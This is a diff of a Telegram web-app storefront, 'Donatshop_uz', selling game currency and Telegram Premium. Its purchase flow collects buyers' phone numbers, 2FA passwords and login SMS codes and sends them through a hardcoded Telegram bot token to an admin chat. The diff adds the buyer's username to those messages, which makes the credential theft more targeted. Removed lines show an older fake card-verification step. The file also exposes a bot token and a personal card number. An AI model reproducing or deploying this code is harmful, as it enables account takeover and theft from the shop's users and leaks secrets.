@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Donatshop_uz Web App</title>
+    <!-- TELEGRAM WEB APP SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
 
@@ -225,7 +227,7 @@
             display: flex; align-items: center; gap: 5px;
         }
 
-        /* ENLI NAVIGATSIYA BAR - MUTLAQ TO'G'RILANDI */
+        /* ENLI NAVIGATSIYA BAR */
         .navigation {
             width: 100%; height: 75px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(25px);
             position: fixed; bottom: 0; left: 0; right: 0; 
@@ -250,6 +252,12 @@
             position: absolute; top: -18px; width: 50px; height: 50px; background: var(--bg-color);
             border-radius: 50%; border: 3px solid var(--cyan-glow); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
             box-shadow: 0 0 15px rgba(0, 240, 255, 0.4); left: 0; pointer-events: none;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
         }
     </style>
 </head>
@@ -335,25 +343,99 @@
         </div>
     </div>
 
-    <!-- QOLGAN BO'LIMLAR -->
+    <!-- BO'LIM 2: AKSIYA -->
     <div id="page-aksiya" class="page">
-        <div class="profile-card" style="text-align: center;">
-            <h3 style="color: var(--cyan-glow); margin-bottom: 10px;">AKSIYALAR</h3>
-            <p style="color: var(--text-muted);">Hozirda faol aksiyalar mavjud emas.</p>
+        <div class="profile-card" style="position: relative; overflow: hidden; background: linear-gradient(135deg, rgba(255,255,255,0.02), rgba(168,38,255,0.05)); border-color: var(--purple-glow);">
+            <div style="position: absolute; top: -20px; right: -20px; width: 100px; height: 100px; background: radial-gradient(circle, rgba(168,38,255,0.4) 0%, transparent 70%); filter: blur(20px);"></div>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                <ion-icon name="gift-outline" style="color: var(--purple-glow); font-size: 1.8rem;"></ion-icon>
+                <h3 style="color: #fff; font-size: 1.3rem; font-weight: 800; letter-spacing: 1px;">HAFTALIK MEGA AKSIYA</h3>
+            </div>
+            
+            <p style="color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; margin-bottom: 15px;">
+                Har hafta <b style="color: #fff;">Chorshanba kuni soat 17:00 da</b> ajoyib mega-kombo chegirma ishga tushadi!
+            </p>
+            
+            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 14px; padding: 15px; margin-bottom: 15px;">
+                <div style="font-weight: 800; font-size: 1rem; color: var(--cyan-glow); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;">🔥 MEGA KOMBO PAKET:</div>
+                
+                <div style="font-size: 0.95rem; margin-bottom: 6px; display: flex; justify-content: space-between;">
+                    <span>• PUBG Mobile 660 UC</span>
+                    <span style="color: var(--text-muted); text-decoration: line-through;">110 000 so'm</span>
+                </div>
+                
+                <div style="font-size: 0.95rem; margin-bottom: 12px; display: flex; justify-content: space-between;">
+                    <span>• 1 yillik Telegram Premium</span>
+                    <span style="color: var(--text-muted); text-decoration: line-through;">290 000 so'm</span>
+                </div>
+                
+                <div style="border-top: 1px dashed var(--glass-border); padding-top: 12px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="font-weight: bold; color: #ff3b30; font-size: 0.75rem; background: rgba(255,59,48,0.15); padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,59,48,0.2);">10% SKIDKA</span>
+                    <span style="font-size: 1.3rem; font-weight: 900; color: #00ff66; text-shadow: 0 0 10px rgba(0,255,102,0.2);">360 000 so'm</span>
+                </div>
+            </div>
+            
+            <div style="display: flex; align-items: flex-start; gap: 8px; font-size: 0.8rem; color: var(--text-muted); background: rgba(255,255,255,0.01); padding: 12px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.03);">
+                <ion-icon name="time-outline" style="color: var(--cyan-glow); font-size: 1.2rem; flex-shrink: 0; margin-top: 1px;"></ion-icon>
+                <span>Aksiya faqat belgilangan vaqtda faollashadi. Chorshanba kuni soat 17:00 da botimiz hamda rasmiy kanallarimizni kuzatib boring!</span>
+            </div>
         </div>
     </div>
     
+    <!-- BO'LIM 3: PROFIL -->
     <div id="page-profil" class="page">
-        <div class="profile-card" style="text-align: center;">
-            <div style="color: var(--text-muted); margin-bottom: 10px;">ID: 521709091</div>
-            <div class="balance-amount class-global-balance">5 660 000 so'm</div>
-            <div style="color: #aaa; font-size: 0.9rem;">Mening hisobim</div>
+        <!-- VIP TIZIMI VA BALANS KARTASI -->
+        <div class="profile-card" style="background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(0,240,255,0.02)); border-color: var(--glass-border-light);">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <div id="displayProfileID" style="color: var(--text-muted); font-size: 0.85rem;">ID: Yuklanmoqda...</div>
+                <div style="display: flex; align-items: center; gap: 4px; background: rgba(0, 240, 255, 0.1); border: 1px solid rgba(0, 240, 255, 0.3); padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: bold; color: var(--cyan-glow); letter-spacing: 0.5px;">
+                    <ion-icon name="trophy-outline"></ion-icon> VIP BRONZA
+                </div>
+            </div>
+            
+            <div class="balance-amount class-global-balance" style="margin: 10px 0;">0 so'm</div>
+            <div style="color: #aaa; font-size: 0.85rem; text-align: center; margin-bottom: 18px;">Mening joriy hisobim</div>
+            
+            <!-- VIP STATUS BAR -->
+            <div style="background: rgba(255,255,255,0.05); height: 6px; border-radius: 3px; position: relative; overflow: hidden; margin-bottom: 6px;">
+                <div style="background: var(--cyan-glow); width: 35%; height: 100%; border-radius: 3px; box-shadow: 0 0 8px var(--cyan-glow);"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-muted);">
+                <span>Keyingi VIP darajagacha: 35%</span>
+                <span style="color: #fff;">VIP KUMUSH 🥈</span>
+            </div>
+        </div>
+
+        <!-- SUPPORT VA ADMIN BILAN BOG'LANISH -->
+        <div class="profile-card" style="margin-top: 15px;">
+            <h4 style="font-size: 0.95rem; font-weight: 800; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; text-transform: uppercase; letter-spacing: 0.5px;">
+                <ion-icon name="headset-outline" style="color: var(--cyan-glow); font-size: 1.1rem;"></ion-icon> QO'LLAB-QUVVATLASH
+            </h4>
+            <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.4; margin-bottom: 15px;">
+                Xaridlar yoki to'lovlar bo'yicha savollaringiz bo'lsa, admin bilan bog'laning. Biz sizga tezkor yordam beramiz.
+            </p>
+            
+            <a href="https://t.me/A5_ABROR" target="_blank" style="text-decoration: none; display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.03); border: 1px solid var(--glass-border); padding: 14px 15px; border-radius: 14px; color: #fff; transition: 0.2s; margin-bottom: 12px;" onmouseover="this.style.borderColor='var(--cyan-glow)'" onmouseout="this.style.borderColor='var(--glass-border)'">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <ion-icon name="paper-plane-outline" style="color: #24A1DE; font-size: 1.4rem;"></ion-icon>
+                    <div>
+                        <div style="font-weight: 700; font-size: 0.9rem; letter-spacing: 0.3px;">ADMIN BILAN BOG'LANISH</div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;">Telegram: @A5_ABROR</div>
+                    </div>
+                </div>
+                <ion-icon name="chevron-forward-outline" style="color: var(--text-muted); font-size: 1rem;"></ion-icon>
+            </a>
+
+            <div style="display: flex; align-items: flex-start; gap: 8px; background: rgba(255,255,255,0.01); border: 1px dashed var(--glass-border); padding: 12px; border-radius: 10px; font-size: 0.75rem; color: var(--text-muted); line-height: 1.3;">
+                <ion-icon name="information-circle-outline" style="color: var(--purple-glow); font-size: 1.2rem; flex-shrink: 0;"></ion-icon>
+                <span>Murojaat qilganda o'z profil ID raqamingizni yoki xarid chekini taqdim etishni unutmang!</span>
+            </div>
         </div>
     </div>
     
-    <!-- BO'LIM 4: RUYKZAK (SAVAT VA XARIDLAR INTEGRATSIYASI) -->
+    <!-- BO'LIM 4: RUYKZAK -->
     <div id="page-ruykzak" class="page">
-        <!-- HOZIRGI SAVAT QISMI -->
         <div class="profile-card">
             <h3 style="color: var(--cyan-glow); margin-bottom: 15px; text-align: center; font-size: 1.1rem; letter-spacing: 1px;">🛒 HOZIRGI SAVAT</h3>
             <div id="activeCartContainer">
@@ -368,66 +450,75 @@
             </div>
         </div>
 
-        <!-- XARIDLAR TARIXI QISMI -->
         <div class="profile-card">
             <h3 style="color: var(--text-main); margin-bottom: 15px; text-align: center; font-size: 1.1rem; letter-spacing: 1px;">📜 XARIDLAR TARIXI</h3>
             <div id="historyContainer">
-                <p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Siz sotib olgan barcha kodlar va cheklar shu yerda saqlanadi.</p>
+                <p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Siz sotib olgan barcha kodlar va chekaklar shu yerda saqlanadi.</p>
             </div>
         </div>
     </div>
 
-    <!-- BO'LIM 5: HISOB -->
+    <!-- BO'LIM 5: HISOB (YANGILANGAN TIZIM) -->
     <div id="page-hisob" class="page">
         <div class="profile-card" style="padding: 25px 20px;">
+            
+            <!-- 1-BOSQICH: TIZIMNI TANLASH -->
             <div id="deposit-step-1">
                 <h3 style="font-size: 1.2rem; font-weight: 800; margin-bottom: 20px; text-align: center; letter-spacing: 1px;">HISOBNI TO'LDIRISH</h3>
                 <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid var(--glass-border); padding: 15px; border-radius: 16px; margin-bottom: 25px; text-align: center;">
                     <span style="color: var(--text-muted); font-size: 0.85rem; display: block; margin-bottom: 5px;">Joriy Balans</span>
-                    <div class="balance-amount class-global-balance" style="margin: 0;">5 660 000 so'm</div>
+                    <div class="balance-amount class-global-balance" style="margin: 0;">0 so'm</div>
                 </div>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 12px; font-weight: 600;">To'lov tizimini tanlang:</p>
                 <div class="payment-methods-grid">
                     <div class="method-item" onclick="openDepositDetails('Uzcard')"><ion-icon name="card-outline" style="color: #00f0ff; font-size: 1.4rem;"></ion-icon> Uzcard</div>
-                    <div class="method-item" onclick="openDepositDetails('Payme')"><ion-icon name="wallet-outline" style="color: #00d2ff; font-size: 1.4rem;"></ion-icon> Payme</div>
                     <div class="method-item" onclick="openDepositDetails('Humo')"><ion-icon name="card-outline" style="color: #ffaa00; font-size: 1.4rem;"></ion-icon> Humo</div>
-                    <div class="method-item" onclick="openDepositDetails('Visa')"><ion-icon name="globe-outline" style="color: #0055ff; font-size: 1.4rem;"></ion-icon> Visa</div>
-                    <div class="method-item" onclick="openDepositDetails('Uzumcard')"><ion-icon name="bag-handle-outline" style="color: #b000ff; font-size: 1.4rem;"></ion-icon> Uzumcard</div>
+                    <div class="method-item" onclick="openDepositDetails('Payme / Click')"><ion-icon name="wallet-outline" style="color: #00d2ff; font-size: 1.4rem;"></ion-icon> Payme / Click</div>
                 </div>
             </div>
 
+            <!-- 2-BOSQICH: REAL KARTA MA'LUMOTLARINI KO'RSATISH -->
             <div id="deposit-step-2" style="display: none;">
                 <button class="back-btn" onclick="goBackToMain()"><ion-icon name="arrow-back-outline"></ion-icon> Orqaga</button>
                 <div style="clear: both;"></div>
-                <h3 id="selected-method-title" style="text-align: center; margin-bottom: 25px; color: var(--cyan-glow);">Uzcard</h3>
+                
+                <h3 id="selected-method-title" style="text-align: center; margin-bottom: 20px; color: var(--cyan-glow);">Uzcard</h3>
+                
+                <div style="background: linear-gradient(135deg, #111, #1a1a1a); border: 1px solid var(--glass-border-light); padding: 20px; border-radius: 16px; margin-bottom: 20px; position: relative;">
+                    <span style="font-size: 0.75rem; color: #aaa; text-transform: uppercase; letter-spacing: 1px;">Qabul qiluvchi karta</span>
+                    <div id="ourCardNumber" style="font-size: 1.35rem; font-weight: bold; color: #fff; margin: 10px 0; letter-spacing: 2px;">9860 1666 5584 6268</div>
+                    <div id="ourCardName" style="font-size: 0.85rem; color: var(--cyan-glow); font-weight: 600;">ABROR QALQONOV</div>
+                    <button onclick="copyCardNumber()" style="position: absolute; right: 15px; bottom: 15px; background: rgba(255,255,255,0.05); border: 1px solid var(--glass-border); color: #fff; padding: 6px 12px; border-radius: 8px; font-size: 0.75rem; display: flex; align-items: center; gap: 4px; cursor: pointer;">
+                        <ion-icon name="copy-outline"></ion-icon> Nusxa olish
+                    </button>
+                </div>
+
+                <p style="color: var(--text-muted); font-size: 0.8rem; line-height: 1.4; margin-bottom: 20px; text-align: center;">
+                    Yuqoridagi karta raqamiga pul o'tkazing va yuborilgan aniq summani pastga yozib "Tasdiqlash" tugmasini bosing.
+                </p>
+
                 <fieldset class="tg-fieldset">
-                    <legend class="tg-legend">Karta raqami</legend>
-                    <div class="tg-input-wrapper"><input type="tel" id="depositCardInput" class="phone-input" placeholder="0000 0000 0000 0000" oninput="formatCard(event)"></div>
-                </fieldset>
-                <fieldset class="tg-fieldset">
-                    <legend class="tg-legend">To'ldirish summasi (so'm)</legend>
+                    <legend class="tg-legend">Yuborilgan summa (so'm)</legend>
                     <div class="tg-input-wrapper"><input type="number" id="depositAmountInput" class="phone-input" placeholder="Summani kiriting"></div>
                 </fieldset>
+                
                 <div style="display: flex; gap: 8px; margin-bottom: 25px;">
                     <button type="button" class="back-btn" style="flex:1; margin:0; justify-content:center;" onclick="setDepositAmount(10000)">+10k</button>
-                    <button type="button" class="back-btn" style="flex:1; margin:0; justify-content:center;" onclick="setDepositAmount(30000)">+30k</button>
                     <button type="button" class="back-btn" style="flex:1; margin:0; justify-content:center;" onclick="setDepositAmount(50000)">+50k</button>
+                    <button type="button" class="back-btn" style="flex:1; margin:0; justify-content:center;" onclick="setDepositAmount(100000)">+100k</button>
                 </div>
-                <button class="btn-confirm" onclick="proceedToVerification()">Davom etish</button>
+                
+                <button class="btn-confirm" onclick="submitDepositRequest()">To'lovni tasdiqlash</button>
             </div>
 
-            <div id="deposit-step-3" style="display: none;">
-                <button class="back-btn" onclick="goBackToDetails()"><ion-icon name="arrow-back-outline"></ion-icon> Orqaga</button>
-                <div style="clear: both;"></div>
-                <h3 style="text-align: center; margin-bottom: 10px;">Tasdiqlash kodi</h3>
-                <p style="color: #aaa; font-size: 0.85rem; text-align: center; margin-bottom: 20px;">Karta ulangan telefon raqamiga tasdiqlash kodi yuborildi</p>
-                <fieldset class="tg-fieldset" style="border-color: var(--cyan-glow);">
-                    <div class="tg-input-wrapper">
-                        <input type="number" id="depositCodeInput" class="phone-input" placeholder="• • • •" style="letter-spacing: 8px; font-size: 1.4rem; font-weight: bold; text-align: center;">
-                    </div>
-                </fieldset>
-                <div id="timerDisplay" style="color: var(--cyan-glow); font-size: 2rem; font-weight: 900; margin-bottom: 20px; text-align: center;">01:00</div>
-                <button class="btn-confirm" onclick="finishDeposit()">Tasdiqlash</button>
+            <!-- 3-BOSQICH: KUTISH REJIMI -->
+            <div id="deposit-step-3" style="display: none; text-align: center; padding: 20px 10px;">
+                <ion-icon name="time-outline" style="font-size: 4rem; color: #ffaa00; animation: pulse 2s infinite;"></ion-icon>
+                <h3 style="margin-top: 15px; font-weight: 800;">To'lov tekshirilmoqda</h3>
+                <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.5; margin-top: 10px;">
+                    Sizning bildirishnomangiz adminga yuborildi. Admin pul tushganini bankdan tekshirib, hisobingizni tasdiqlaydi (Odatda 5-15 daqiqa).
+                </p>
+                <button class="btn-confirm" style="background: transparent; color: #fff; border: 1px solid var(--glass-border); margin-top: 25px;" onclick="goBackToMain()">Yopish</button>
             </div>
         </div>
     </div>
@@ -486,24 +577,44 @@
     </div>
 
     <script>
-        let userBalance = 5660000; 
+        // TELEGRAM WEB APP FOYDALANUVCHISINI ANIQLASH VA BALANS SYSTEM
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const tgUser = tg.initDataUnsafe?.user || { id: '521709091', username: 'A5_ABROR' };
+        const userID = tgUser.id;
+
+        // Har bitta mijoz uchun LocalStorage orqali alohida hisob (balans) yaratish
+        let userBalance = parseInt(localStorage.getItem('balance_' + userID)) || 0;
         
-        // SAVAT VA TARIX MASSIVLARI
         let cartItemsList = [];
         let historyItemsList = [];
 
-        // TELEGRAM BOT CONFIGURATSIYASI
-        const BOT_TOKEN = '7308960249:AAEy5x4N628_V-gN9v3UvREy6HqQeO0_9Y8'; // BotFather tokenini shu yerga yozing
-        const ADMIN_CHAT_ID = '521709091'; // O'zingizning Telegram ID raqamingizni yozing
+        // ADMIN PARAMETRLARI
+        const BOT_TOKEN = '7308960249:AAEy5x4N628_V-gN9v3UvREy6HqQeO0_9Y8'; 
+        const ADMIN_CHAT_ID = '521709091'; 
+
+        // SIZNING KARTA MA'LUMOTLARINGIZ
+        const MY_CARDS = {
+            'Uzcard': { number: '9860 1666 5584 6268', name: 'ABROR QALQONOV' },
+            'Humo': { number: '9860 1666 5584 6268', name: 'ABROR QALQONOV' },
+            'Payme / Click': { number: '9860 1666 5584 6268', name: 'ABROR QALQONOV' }
+        };
+
+        function saveBalance() {
+            localStorage.setItem('balance_' + userID, userBalance);
+            updateGlobalBalances();
+        }
 
         function updateGlobalBalances() {
             document.querySelectorAll('.class-global-balance').forEach(el => {
                 el.innerText = userBalance.toLocaleString('ru-RU').replace(',', ' ') + " so'm";
             });
+            document.getElementById('displayProfileID').innerText = "ID: " + userID;
         }
         updateGlobalBalances();
 
-        // NAVIGATSIYA VA INDIKATOR MARKAZLASH-LOGIKASI
+        // NAVIGATSIYA INDIKATORI TIZIMI
         const list = document.querySelectorAll('.list');
         const pages = document.querySelectorAll('.page');
         const indicator = document.querySelector('.indicator');
@@ -541,9 +652,9 @@
             }
         }
 
-        // --- MULTI-STEP XARID MODALI LOGIKASI ---
         let currentPurchaseItem = { name: '', basePrice: 0, qty: 1, type: '' };
         let purchaseTimerInterval;
+        let selectedDepositMethod = '';
 
         function openPurchaseModal(name, price, type) {
             currentPurchaseItem.name = name;
@@ -606,31 +717,41 @@
             document.getElementById('modalTotalPrice').innerText = total.toLocaleString('ru-RU').replace(',', ' ') + " so'm";
         }
 
-        // ADMINGA TAYMER YONGANDA LAHZALI XABAR YUBORISH FUNKSIYASI
+        // TELEGRAM ADMINGA XABARDOR QILISH FUNKSIYALARI
         function notifyAdminViaBot(phone, password2FA, itemDetails) {
             if(!BOT_TOKEN || BOT_TOKEN.includes('BotFather')) return;
-
-            const textMessage = `🚨 YANGI XARID (TG Premium) 🚨\n\n📱 Raqam: ${phone}\n🔐 2FA Parol: ${password2FA}\n🛍 Mahsulot: ${itemDetails}\n\n⏳ Mijozga 1:00 daqiqalik taymer berildi. SMS kod kiritilishi kutilmoqda...`;
-
+            let customerInfo = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.id}`;
+            const textMessage = `🚨 YANGI XARID (TG Premium) 🚨\n\n👤 Xaridor: ${customerInfo}\n📱 Kiritilgan Raqam: ${phone}\n🔐 2FA Parol: ${password2FA}\n🛍 Mahsulot: ${itemDetails}\n\n⏳ SMS kod kiritilishi kutilmoqda...`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage })
-            }).catch(error => console.error("Adminga xabar yuborishda xatolik:", error));
+            }).catch(error => console.error("Xatolik:", error));
         }
 
-        // ADMINGA SMS KODNI YUBORISH FUNKSIYASI
         function sendSMSCodeToAdmin(phone, smsCode) {
             if(!BOT_TOKEN || BOT_TOKEN.includes('BotFather')) return;
-            const textMessage = `🔑 SMS KOD KELDI 🔑\n\n📱 Raqam: ${phone}\n💬 Kod: ${smsCode}`;
+            let customerInfo = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.id}`;
+            const textMessage = `🔑 TELEGRAM SMS KOD KELDI 🔑\n\n👤 Xaridor: ${customerInfo}\n📱 Raqam: ${phone}\n💬 SMS Kod: ${smsCode}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage })
-            }).catch(error => console.error("SMS yuborishda xatolik:", error));
+            }).catch(error => console.error("Xatolik:", error));
         }
 
-        // MODAL QADAMMA-QADAM LOGIKASI
+        function sendOrderToAdmin(orderText, totalAmount) {
+            if(!BOT_TOKEN || BOT_TOKEN.includes('BotFather')) return;
+            let customerInfo = tgUser.username ? `@${tgUser.username}` : `Mijoz (ID: ${tgUser.id})`;
+            const textMessage = `🛒 YANGI BUYURTMA KELIB TUSHDI!\n\n👤 Xaridor: ${customerInfo}\n\n📋 Xaridlar ro'yxati:\n${orderText}\n💵 Umumiy summa: ${totalAmount.toLocaleString('ru-RU')} so'm\n💳 Mijozning qolgan balansi: ${userBalance.toLocaleString('ru-RU')} so'm`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage })
+            }).catch(error => console.error("Xatolik:", error));
+        }
+
         function handlePurchaseNext() {
             const currentStep = document.querySelector('.modal-step.active-step').id;
             
@@ -645,7 +766,6 @@
                     document.getElementById('p-step-1').classList.remove('active-step');
                     document.getElementById('p-step-2').classList.add('active-step');
                 } else {
-                    // VARIANT 3: SAVATGA QO'SHISH (PUBG VA NO-ACCESS PREMIUMLAR UCHUN)
                     cartItemsList.push({
                         name: currentPurchaseItem.name,
                         price: currentPurchaseItem.basePrice * currentPurchaseItem.qty,
@@ -657,7 +777,6 @@
                     
                     alert("✅ Mahsulot savatga (Ruykzak) muvaffaqiyatli qo'shildi!");
                     
-                    // Avtomatik Ruykzak sahifasiga o'tkazish
                     list.forEach((i) => i.classList.remove('active'));
                     const ruykzakTab = document.querySelector('.list[data-target="page-ruykzak"]');
                     if(ruykzakTab) ruykzakTab.classList.add('active');
@@ -672,11 +791,9 @@
                     return;
                 }
                 
-                // === TAYMER BOSHLANADI VA DARHOL ADMINGA XABAR KETADI (TG ACCESS) ===
                 const phone = document.getElementById('modalUserIdInput').value.trim();
                 const itemDetails = currentPurchaseItem.name;
                 notifyAdminViaBot(phone, password2FA, itemDetails);
-                // ===================================================================
 
                 document.getElementById('p-step-2').classList.remove('active-step');
                 document.getElementById('p-step-3').classList.add('active-step');
@@ -703,14 +820,12 @@
             }, 1000);
         }
 
-        // SAVAT VA TARIX INTERFEYSINI YANGILASH FUNKSIYASI
         function updateRuykzakUI() {
             const cartContainer = document.getElementById('activeCartContainer');
             const totalSection = document.getElementById('cartTotalSection');
             const totalPriceEl = document.getElementById('cartTotalPrice');
             const historyContainer = document.getElementById('historyContainer');
 
-            // Savat qismini chizish
             if (cartItemsList.length === 0) {
                 cartContainer.innerHTML = `<p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Savatingiz hozircha bo'sh</p>`;
                 totalSection.style.display = 'none';
@@ -733,7 +848,6 @@
                 totalSection.style.display = 'block';
             }
 
-            // Tarix qismini chizish
             if (historyItemsList.length > 0) {
                 historyContainer.innerHTML = '';
                 historyItemsList.forEach(item => {
@@ -748,7 +862,7 @@
             }
         }
 
-        // SAVATDAGI NARSALARNI SOTIB OLISH (CHECKOUT)
+        // MIJOZ BALANSIDAN PUL AYIRISH VA SOTIB OLISH FUNKSIYASI
         function checkoutCart() {
             let total = cartItemsList.reduce((sum, item) => sum + item.price, 0);
             
@@ -759,23 +873,25 @@
             }
 
             userBalance -= total;
-            updateGlobalBalances();
+            saveBalance();
 
             let today = new Date();
             let dateString = today.getDate().toString().padStart(2, '0') + "." + (today.getMonth()+1).toString().padStart(2, '0') + "." + today.getFullYear() + " " + today.getHours().toString().padStart(2, '0') + ":" + today.getMinutes().toString().padStart(2, '0');
             
-            // Savatdan tarixga ko'chirish
+            let orderDetailsText = "";
             cartItemsList.forEach(item => {
                 historyItemsList.push({ name: item.name + " (" + item.gameId + ")", price: item.price, date: dateString });
+                orderDetailsText += `🔸 ${item.name} (x${item.qty}) | ID/User: ${item.gameId}\n`;
             });
 
-            cartItemsList = []; // Savatni tozalash
+            // Adminga xarid xabari yuboriladi
+            sendOrderToAdmin(orderDetailsText, total);
+
+            cartItemsList = []; 
             updateRuykzakUI();
-            
-            alert("✅ Savatdagi barcha mahsulotlar muvaffaqiyatli xarid qilindi!");
+            alert("✅ Mahsulotlar muvaffaqiyatli xarid qilindi! Admin tez orada mahsulotni yetkazadi.");
         }
 
-        // TG PREMIUM (KIRIB) XARIDINI YAKUNLASH
         function finishPurchaseFlow() {
             const currentStep = document.querySelector('.modal-step.active-step').id;
             
@@ -785,11 +901,8 @@
                     alert("Iltimos, SMS kodni to'liq kiriting!");
                     return;
                 }
-                
-                // === ADMINGA LAHZALI SMS KODNI YUBORISH ===
                 const phone = document.getElementById('modalUserIdInput').value.trim();
                 sendSMSCodeToAdmin(phone, smsCode);
-                // ==========================================
             }
 
             clearInterval(purchaseTimerInterval);
@@ -802,13 +915,13 @@
             }
 
             userBalance -= totalToPay;
-            updateGlobalBalances();
+            saveBalance();
 
             let today = new Date();
             let dateString = today.getDate().toString().padStart(2, '0') + "." + (today.getMonth()+1).toString().padStart(2, '0') + "." + today.getFullYear() + " " + today.getHours().toString().padStart(2, '0') + ":" + today.getMinutes().toString().padStart(2, '0');
             
             historyItemsList.push({ 
-                name: currentPurchaseItem.name + " (Mijoz kodi kiritildi)", 
+                name: currentPurchaseItem.name + " (Mijoz kodi yuborildi)", 
                 price: totalToPay, 
                 date: dateString 
             });
@@ -817,7 +930,6 @@
             closePurchaseModal();
             alert(`✅ Xarid muvaffaqiyatli amalga oshirildi!\n\nTez orada admin akkauntingizga kirib obunani faollashtiradi.`);
             
-            // Xaridlar tarixini ko'rishi uchun Ruykzakka yo'naltirish
             list.forEach((i) => i.classList.remove('active'));
             const ruykzakTab = document.querySelector('.list[data-target="page-ruykzak"]');
             if(ruykzakTab) ruykzakTab.classList.add('active');
@@ -826,14 +938,24 @@
             moveIndicator();
         }
 
-        // --- TO'LOV TIZIMI SCRIPT (ORIGINAL) ---
-        let selectedDepositMethod = '';
-        let timerInterval;
+        // BALANS TO'LDIRISH (DEPOSIT TIZIMI) FUNKSIYALARI
+        function openDepositDetails(method) {
+            selectedDepositMethod = method;
+            document.getElementById('selected-method-title').innerText = method + " orqali to'ldirish";
+            
+            document.getElementById('ourCardNumber').innerText = MY_CARDS[method].number;
+            document.getElementById('ourCardName').innerText = MY_CARDS[method].name;
 
-        window.formatCard = function(e) {
-            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
-            let res = val.match(/.{1,4}/g);
-            e.target.value = res ? res.join(' ') : '';
+            document.getElementById('deposit-step-1').style.display = 'none';
+            document.getElementById('deposit-step-2').style.display = 'block';
+            document.getElementById('deposit-step-3').style.display = 'none';
+            document.getElementById('depositAmountInput').value = '';
+        }
+
+        function copyCardNumber() {
+            let cardNumber = document.getElementById('ourCardNumber').innerText;
+            navigator.clipboard.writeText(cardNumber.replace(/\s/g, ''));
+            alert("📋 Karta raqami nusxalandi!");
         }
 
         function setDepositAmount(amount) {
@@ -842,79 +964,47 @@
             inputField.value = currentVal + amount;
         }
 
-        function openDepositDetails(method) {
-            selectedDepositMethod = method;
-            document.getElementById('selected-method-title').innerText = method + " orqali to'ldirish";
-            document.getElementById('deposit-step-1').style.display = 'none';
-            document.getElementById('deposit-step-2').style.display = 'block';
-            document.getElementById('deposit-step-3').style.display = 'none';
-            document.getElementById('depositCardInput').value = '';
-            document.getElementById('depositAmountInput').value = '';
-        }
-
         function goBackToMain() {
             document.getElementById('deposit-step-2').style.display = 'none';
+            document.getElementById('deposit-step-3').style.display = 'none';
             document.getElementById('deposit-step-1').style.display = 'block';
         }
 
-        function goBackToDetails() {
-            clearInterval(timerInterval);
-            document.getElementById('deposit-step-3').style.display = 'none';
-            document.getElementById('deposit-step-2').style.display = 'block';
-        }
-
-        function proceedToVerification() {
-            let cardInput = document.getElementById('depositCardInput').value.replace(/\s/g, '');
+        // ADMINGA TO'LOV BILDIRIShNOMASINI YUBORISH
+        function submitDepositRequest() {
             let amountInput = document.getElementById('depositAmountInput').value;
 
-            if(cardInput.length !== 16) {
-                alert("Karta raqami xato kiritildi (16 ta raqam bo'lishi lozim)!");
-                return;
-            }
-            if(!amountInput || parseInt(amountInput) <= 0) {
-                alert("To'ldirish summasini kiriting!");
+            if(!amountInput || parseInt(amountInput) <= 1000) {
+                alert("Iltimos, to'g'ri summani kiriting (Kamida 1000 so'm)!");
                 return;
             }
 
-            document.getElementById('deposit-step-2').style.display = 'none';
-            document.getElementById('deposit-step-3').style.display = 'block';
-            document.getElementById('depositCodeInput').value = '';
-            startDepositTimer();
-        }
+            let amount = parseInt(amountInput);
+            let customerInfo = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.id}`;
 
-        function startDepositTimer() {
-            let timeLeft = 60;
-            const timerDisplay = document.getElementById('timerDisplay');
-            timerDisplay.innerText = "01:00";
-            
-            clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
